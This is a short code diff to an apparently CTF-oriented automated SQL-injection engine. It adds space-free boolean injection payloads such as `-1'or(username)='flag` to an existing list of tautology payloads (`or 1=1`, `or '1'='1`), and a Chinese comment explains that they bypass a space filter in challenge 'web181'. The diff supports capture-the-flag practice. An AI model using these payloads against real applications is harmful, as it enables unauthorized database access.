@@ -151,7 +151,9 @@ class Engine:
         else:
             c = inj.closure
             payloads = [f"{base}{c} or 1=1{tail}", f"{base}{c}or(1=1){tail}",
-                        f"{base}{c} or '1'='1{tail}"]
+                        f"{base}{c} or '1'='1{tail}",
+                        # 空格被滤时用括号/无空格形式（web181：`-1'or(username)='flag`）
+                        f"-1{c}or(username)='flag", f"-1{c}or(username)like'flag"]
         for p in payloads:
             if s.stopped or s.found_flags:
                 return
